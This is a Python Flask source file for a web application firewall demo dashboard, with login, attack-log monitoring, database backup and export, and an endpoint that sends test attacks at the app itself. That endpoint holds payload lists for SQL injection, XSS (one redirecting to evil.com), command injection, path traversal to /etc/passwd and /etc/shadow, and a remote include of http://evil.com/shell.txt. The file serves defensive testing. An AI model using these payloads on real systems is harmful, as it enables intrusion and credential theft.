from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from werkzeug.security import check_password_hash
from middleware import waf_middleware
from database import get_user_by_username, init_db, get_attack_stats, get_recent_logs, get_connection
from anomaly_detection import anomaly_detector
import sqlite3
import os
import shutil
from datetime import datetime
import threading
import time
import requests

app = Flask(__name__)
app.secret_key = "replace-with-a-secure-random-secret"  # <-- CHANGE for production

# initialize DB (creates tables if not exists)
init_db()

# apply WAF middleware
waf_middleware(app)

@app.route('/')
def index():
    if "user_id" in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    # If already logged in, redirect
    if "user_id" in session:
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        user = get_user_by_username(username)
        if not user:
            flash("Invalid username or password", "danger")
            return render_template('login.html', username=username)

        user_id, db_username, db_password_hash = user

        if check_password_hash(db_password_hash, password):
            # Login success
            session['user_id'] = user_id
            session['username'] = db_username
            flash("Login successful", "success")
            return redirect(url_for('dashboard'))
        else:
            flash("Invalid username or password", "danger")
            return render_template('login.html', username=username)

    # GET
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    return render_template('dashboard.html', username=session.get('username'))

@app.route('/monitor')
def monitor():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    # Get statistics and recent logs
    stats = get_attack_stats()
    recent_logs = get_recent_logs(limit=50)
    
    return render_template('monitor.html', 
                         username=session.get('username'),
                         stats=stats,
                         logs=recent_logs)

@app.route('/tools')
def tools():
    """Tools page for database management and attack testing"""
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    # Get database statistics
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM logs")
    total_logs = cursor.fetchone()[0]
    
    cursor.execute("SELECT DISTINCT type FROM logs ORDER BY type")
    attack_types = [row[0] for row in cursor.fetchall()]
    
    cursor.execute("""
        SELECT ip, COUNT(*) as count 
        FROM logs 
        GROUP BY ip 
        ORDER BY count DESC 
        LIMIT 10
    """)
    top_ips = [dict(row) for row in cursor.fetchall()]
    
    conn.close()
    
    return render_template('tools.html', 
                         username=session.get('username'),
                         total_logs=total_logs,
                         attack_types=attack_types,
                         top_ips=top_ips)

# ==========================================
# DATABASE MANAGEMENT API ENDPOINTS
# ==========================================

@app.route('/api/db/stats')
def api_db_stats():
    """Get database statistics"""
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM logs")
    total = cursor.fetchone()[0]
    
    cursor.execute("SELECT type, COUNT(*) as count FROM logs GROUP BY type ORDER BY count DESC")
    by_type = [{"type": row[0], "count": row[1]} for row in cursor.fetchall()]
    
    conn.close()
    
    return jsonify({"total": total, "by_type": by_type})

@app.route('/api/db/clear', methods=['POST'])
def api_clear_logs():
    """Clear all logs from database"""
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json()
    clear_type = data.get('type', 'all')
    
    conn = get_connection()
    cursor = conn.cursor()
    
    try:
        if clear_type == 'all':
            cursor.execute("SELECT COUNT(*) FROM logs")
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs")
            conn.commit()
            message = f"Deleted {count} log entries"
        
        elif clear_type == 'by_attack_type':
            attack_type = data.get('attack_type')
            cursor.execute("SELECT COUNT(*) FROM logs WHERE type = ?", (attack_type,))
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs WHERE type = ?", (attack_type,))
            conn.commit()
            message = f"Deleted {count} '{attack_type}' entries"
        
        elif clear_type == 'by_ip':
            ip = data.get('ip')
            cursor.execute("SELECT COUNT(*) FROM logs WHERE ip = ?", (ip,))
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs WHERE ip = ?", (ip,))
            conn.commit()
            message = f"Deleted {count} entries from {ip}"
        
        else:
            return jsonify({"error": "Invalid clear type"}), 400
        
        conn.close()
        return jsonify({"success": True, "message": message, "deleted": count})
    
    except Exception as e:
        conn.close()
        return jsonify({"error": str(e)}), 500

@app.route('/api/db/backup', methods=['POST'])
def api_backup_db():
    """Create database backup"""
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    backup_dir = "backups"
    db_file = "app_data.db"
    
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = os.path.join(backup_dir, f"app_data_backup_{timestamp}.db")
    
    try:
        shutil.copy2(db_file, backup_file)
        file_size = os.path.getsize(backup_file)
        return jsonify({
            "success": True,
            "message": f"Backup created successfully",
            "filename": os.path.basename(backup_file),
            "size": file_size
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/db/export', methods=['GET'])
def api_export_csv():
    """Export logs to CSV"""
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, time, ip, type, payload, path, user_agent FROM logs ORDER BY id")
    
    # Generate CSV content
    csv_lines = ["ID,Time,IP,Type,Payload,Path,User_Agent"]
    for row in cursor.fetchall():
        row_escaped = [str(field).replace('"', '""') for field in row]
        line = ','.join([f'"{field}"' for field in row_escaped])
        csv_lines.append(line)
    
    conn.close()
    
    csv_content = '\n'.join(csv_lines)
    
    from flask import Response
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"attack_logs_{timestamp}.csv"
    
    return Response(
        csv_content,
        mimetype="text/csv",
        headers={"Content-disposition": f"attachment; filename={filename}"}
    )

# ==========================================
# ATTACK GENERATION API ENDPOINTS
# ==========================================

@app.route('/api/attacks/generate', methods=['POST'])
def api_generate_attacks():
    """Generate test attacks"""
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json()
    attack_category = data.get('category', 'all')
    
    def generate_in_background():
        base_url = request.host_url.rstrip('/')
        results = {"total": 0, "blocked": 0, "categories": {}}
        
        def send_attack(path, params):
            try:
                response = requests.get(f"{base_url}{path}", params=params, timeout=5)
                return response.status_code == 403
            except:
                return False
        
        if attack_category in ['all', 'sql']:
            attacks = [
                ("/search", {"q": "' UNION SELECT username,password FROM users--"}),
                ("/product", {"id": "1' UNION ALL SELECT null,database(),user()--"}),
                ("/filter", {"category": "books' OR 1=1--"}),
                ("/login", {"username": "admin'--", "password": "anything"}),
                ("/search", {"q": "test' AND SLEEP(5)--"}),
            ]
            blocked = sum(1 for path, params in attacks if send_attack(path, params))
            results["categories"]["SQL Injection"] = {"sent": len(attacks), "blocked": blocked}
            results["total"] += len(attacks)
            results["blocked"] += blocked
            time.sleep(0.5)
        
        if attack_category in ['all', 'xss']:
            attacks = [
                ("/search", {"q": "<script>alert('XSS')</script>"}),
                ("/comment", {"text": "<script>document.location='http://evil.com'</script>"}),
                ("/search", {"q": "<img src=x onerror=alert(1)>"}),
                ("/input", {"data": "<svg/onload=alert('XSS')>"}),
                ("/profile", {"website": "javascript:alert(document.cookie)"}),
            ]
            blocked = sum(1 for path, params in attacks if send_attack(path, params))
            results["categories"]["XSS"] = {"sent": len(attacks), "blocked": blocked}
            results["total"] += len(attacks)
            results["blocked"] += blocked
            time.sleep(0.5)
        
        if attack_category in ['all', 'cmd']:
            attacks = [
                ("/exec", {"cmd": "; cat /etc/passwd"}),
                ("/run", {"command": "| ls -la"}),
                ("/ping", {"host": "127.0.0.1; whoami"}),
                ("/system", {"input": "`id`"}),
                ("/exec", {"cmd": "$(uname -a)"}),
            ]
            blocked = sum(1 for path, params in attacks if send_attack(path, params))
            results["categories"]["Command Injection"] = {"sent": len(attacks), "blocked": blocked}
            results["total"] += len(attacks)
            results["blocked"] += blocked
            time.sleep(0.5)
        
        if attack_category in ['all', 'traversal']:
            attacks = [
                ("/files", {"path": "../../../../etc/passwd"}),
                ("/download", {"file": "..\\..\\..\\windows\\system32\\config\\sam"}),
                ("/include", {"page": "../../../etc/shadow"}),
                ("/read", {"file": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}),
            ]
            blocked = sum(1 for path, params in attacks if send_attack(path, params))
            results["categories"]["Directory Traversal"] = {"sent": len(attacks), "blocked": blocked}
            results["total"] += len(attacks)
            results["blocked"] += blocked
            time.sleep(0.5)
        
        if attack_category in ['all', 'file']:
            attacks = [
                ("/include", {"file": "php://filter/convert.base64-encode/resource=/etc/passwd"}),
                ("/load", {"url": "http://evil.com/shell.txt"}),
                ("/include", {"file": "../../../../etc/passwd%00"}),
            ]
            blocked = sum(1 for path, params in attacks if send_attack(path, params))
            results["categories"]["File Inclusion"] = {"sent": len(attacks), "blocked": blocked}
            results["total"] += len(attacks)
            results["blocked"] += blocked
        
        # Store results in session or database for retrieval
        with app.app_context():
            app.config['LAST_ATTACK_RESULTS'] = results
    
    # Run in background thread
    thread = threading.Thread(target=generate_in_background)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "success": True,
        "message": "Attack generation started in background",
        "note": "Refresh the monitor page in 10-15 seconds to see results"
    })

@app.route('/api/attacks/status')
def api_attack_status():
    """Get status of last attack generation"""
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    results = app.config.get('LAST_ATTACK_RESULTS', None)
    if results:
        return jsonify(results)
    else:
        return jsonify({"message": "No attack generation results available"})

@app.route('/api/logs')
def api_logs():
    if "user_id" not in session:
        return {"error": "Unauthorized"}, 401
    
    # Get query parameters
    limit = request.args.get('limit', 100, type=int)
    offset = request.args.get('offset', 0, type=int)
    attack_type = request.args.get('type', None)
    
    logs = get_recent_logs(limit=limit, offset=offset, attack_type=attack_type)
    return {"logs": [dict(log) for log in logs]}

@app.route('/logout')
def logout():
    session.clear()
    flash("Logged out", "info")
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)